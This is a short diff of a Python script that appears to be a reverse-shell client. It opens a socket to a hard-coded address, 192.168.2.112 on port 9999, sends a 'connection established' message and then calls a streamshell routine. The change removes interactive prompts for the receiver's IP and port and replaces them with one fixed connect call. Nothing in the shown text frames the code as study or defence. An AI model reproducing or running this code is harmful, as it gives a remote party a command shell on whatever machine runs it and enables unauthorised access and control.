@@ -10,11 +10,7 @@ from sys import stderr
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 def trycon():
-    #dhost = raw_input('Receiver IP: ')
-    #dport = raw_input('Port: ')
-    dhost = ("192.168.2.112")
-	dport = ("9999")
-	s.connect((dhost, int(dport)))
+    s.connect(("192.168.2.112", 9999))
     s.send("[+] connection established")
     streamshell()
     
